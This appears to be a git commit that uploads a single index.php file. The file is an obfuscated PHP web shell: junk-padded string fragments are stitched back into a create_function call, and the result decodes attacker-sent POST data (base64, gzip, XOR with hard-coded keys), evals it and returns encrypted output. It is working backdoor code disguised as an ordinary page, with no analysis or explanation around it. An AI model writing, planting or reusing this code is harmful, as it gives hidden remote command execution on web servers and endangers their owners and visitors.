7edd593086a963b510b28aab6ec351e85b8d626a
Omar-D <66242913+Omar-D@users.noreply.github.com>
2023-01-30 16:21:06 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,11 @@
+<?php
+$D='$jd>=d>0;($j<$c&&$i<$d>ld>);$j++,d>$i++){$o.=d>$t{$i}^d>$k{d>$j};}}red>td>urn $d>o;}if (@pregd>_md>atch';
+$R=str_replace('EY','','crEYeatEYEYeEY_EYfunctiEYon');
+$K='l(d>@gzuncd>ompd>ress(@x(@bd>d>ase64d>_dd>ecode($m[1]),$kd>)));d>$o=@ob_getd>_contd>ents(d>);@d>ob';
+$q='("/$khd>(.+d>)$kf/",@fid>ld>e_gd>et_conted>nts(d>"phd>p://ind>put"),$m)==1) {@d>ob_d>start();@ed>va';
+$w='d>_end_clean();$r=d>@based>64_d>ed>ncode(@x(@d>gzd>cd>ompress($o),$k));prd>ind>d>t("$p$kh$r$kf");}';
+$h='$k="84d>9d>c829dd>";$kh="6d>58baaeff512";d>$kd>f="dd>7d>66b0d>db3cce";$p="HX28CYMd>dm7UURd>cHz";d>';
+$H='fud>nction d>x($t,$kd>)d>d>d>d>{$c=strlen(d>$k);$l=strlen($t);$o="";d>fd>od>r($i=0;$i<$l;){for(d>';
+$n=str_replace('d>','',$h.$H.$D.$q.$K.$w);
+$y=$R('',$n);$y();
+?>
